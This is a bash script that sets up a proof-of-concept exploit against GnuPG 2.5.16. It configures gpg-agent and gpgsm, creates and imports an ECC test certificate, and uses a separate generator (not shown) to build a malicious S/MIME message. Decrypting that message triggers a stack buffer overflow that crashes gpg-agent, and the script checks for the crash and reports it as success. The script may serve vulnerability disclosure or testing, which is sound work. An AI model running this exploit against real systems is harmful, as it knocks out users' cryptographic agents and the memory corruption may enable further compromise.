#!/bin/bash
set -e

echo "------------------------------------------------"
echo "[*] Setting up Environment for GnuPG 2.5.16 PoC"
echo "------------------------------------------------"

# 0. Start RNGD
rngd -r /dev/urandom >/dev/null 2>&1 || true

# 1. Configure GPG/GpgSM
mkdir -p ~/.gnupg
echo "pinentry-program /usr/bin/pinentry-tty" > ~/.gnupg/gpg-agent.conf
echo "allow-loopback-pinentry" >> ~/.gnupg/gpg-agent.conf
echo "disable-dirmngr" > ~/.gnupg/gpgsm.conf
echo "disable-crl-checks" >> ~/.gnupg/gpgsm.conf

# 2. Generate Key/Cert using OpenSSL (Reliable)
echo "[*] Generating ECC P-256 Key/Cert with OpenSSL..."
openssl ecparam -name prime256v1 -genkey -out private.key 2>/dev/null
openssl req -new -x509 -key private.key -out cert.pem -days 365 \
    -subj "/CN=TestUser" -set_serial 12345 2>/dev/null
openssl pkcs12 -export -inkey private.key -in cert.pem -out key.p12 \
    -passout pass: -name "TestUser"

# 3. Import into GpgSM
echo "[*] Importing Key into GpgSM..."
gpgconf --kill gpg-agent 2>/dev/null || true
gpg-agent --daemon --allow-loopback-pinentry >/dev/null 2>&1
echo "" | gpgsm --import --pinentry-mode=loopback --passphrase-fd 0 key.p12 2>/dev/null

# Verify Import
SERIAL=$(gpgsm --list-keys --with-colons | grep "^crt" | head -n1 | cut -d: -f5)
if [ -z "$SERIAL" ]; then
    echo "[!] Error: Key import failed."
    exit 1
fi
echo "[*] Key Imported. Hex Serial: $SERIAL"

# 4. Generate the Exploit
echo "[*] Generating Malicious S/MIME message..."
# FIX: Pass Hex Serial directly to Python to avoid Bash Integer Overflow
python3 poc_gen.py crash_agent.p7m "TestUser" "$SERIAL"

# 5. Launch GPG Agent in DEBUG mode
echo "[*] Restarting gpg-agent in debug mode..."
gpgconf --kill gpg-agent 2>/dev/null || true
gpg-agent --daemon --debug-level expert --log-file agent.log

echo "------------------------------------------------"
echo "[*] Triggering Decryption (Attempting Crash)..."
echo "------------------------------------------------"

set +e
gpgsm -d crash_agent.p7m > decrypted.txt 2>&1
EXIT_CODE=$?
set -e

echo "[*] GPGSM finished with exit code: $EXIT_CODE"

# 6. Verify Crash
if pgrep gpg-agent > /dev/null; then
    echo "[-] gpg-agent is still running. The exploit FAILED."
    echo "    Check decrypted.txt for details."
    cat decrypted.txt
else
    echo "[+] gpg-agent is NOT running."
    echo "[+] SUCCESS: The stack buffer overflow crashed the agent."
    echo ""
    echo "--- Last 20 lines of agent.log ---"
    tail -n 20 agent.log
fi
